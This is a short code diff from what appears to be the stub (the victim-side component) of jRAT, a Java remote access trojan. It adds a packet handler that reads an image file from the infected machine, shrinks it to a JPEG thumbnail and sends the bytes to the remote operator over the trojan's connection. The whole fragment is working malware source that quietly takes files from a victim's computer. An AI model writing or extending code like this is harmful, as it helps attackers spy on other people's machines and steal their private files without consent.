@@ -1,9 +1,15 @@
 package se.jrat.stub.packets.outgoing;
 
+import java.awt.image.BufferedImage;
+import java.io.ByteArrayOutputStream;
 import java.io.DataOutputStream;
+import java.io.File;
+
+import javax.imageio.ImageIO;
 
 import se.jrat.common.io.StringWriter;
 import se.jrat.stub.Connection;
+import se.jrat.stub.utils.ImageUtils;
 
 
 public class Packet59ThumbnailPreview extends AbstractOutgoingPacket {
@@ -17,8 +23,18 @@ public class Packet59ThumbnailPreview extends AbstractOutgoingPacket {
 	@Override
 	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
 		sw.writeLine(file);
+		
+		BufferedImage image = ImageIO.read(new File(file));
+		image = ImageUtils.resize(image, 150, 100);
+		
+		ByteArrayOutputStream bss = new ByteArrayOutputStream();
 
-		Connection.lock();
+		 
+		ImageIO.write(image, "jpg", bss);
+		byte[] buffer = bss.toByteArray();
+		
+		Connection.dos.writeInt(buffer.length);
+		Connection.dos.write(buffer);
 	}
 
 	@Override
